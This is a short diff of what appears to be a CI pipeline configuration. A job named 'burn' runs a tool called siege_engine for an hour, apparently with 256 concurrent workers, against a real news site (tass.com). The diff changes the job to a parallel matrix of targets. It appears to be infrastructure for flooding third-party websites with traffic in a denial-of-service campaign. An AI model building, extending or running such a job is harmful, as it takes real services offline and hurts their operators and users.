@@ -9,7 +9,7 @@ stages:
 
 burn:
   stage: burn
-  script: timeout 1h python -m siege_engine 256 tass.com
+  script: timeout 1h python -m siege_engine 256 $target
   parallel: 
     matrix:
     - target:
